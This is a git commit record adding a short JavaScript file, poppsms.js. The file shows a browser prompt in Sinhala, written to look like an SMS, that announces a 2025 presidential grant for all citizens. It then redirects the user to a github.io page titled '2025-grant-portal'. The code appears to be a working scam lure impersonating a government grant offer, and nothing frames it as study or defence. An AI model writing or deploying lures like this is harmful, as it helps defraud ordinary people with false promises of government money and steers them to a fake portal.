b163369b535a67bc902658e82ff716bba3aa5b8c
offernoww <josiahnyeti16@gmail.com>
2025-01-29 21:23:29 +0100

    Create poppsms.js

---
+++ poppsms.js
@@ -0,0 +1,6 @@
+
+var password = 'ප්‍රදාන ද්වාරය 2025'
+password=prompt('SMS :2025 සියලුම පුරවැසියන් සඳහා වන ජනාධිපති ප්‍රදානය සඳහා අයදුම් කරන්න, ඔබේ එක ලබා ගැනීමට OK ක්ලික් කරන්න.  ','ප්‍රදාන ද්වාරය 2025');
+if (password != 'ප්‍රදාන ද්වාරය 2025') {
+location.href='https://offernoww.github.io/2025-grant-portal-Ik';
+}
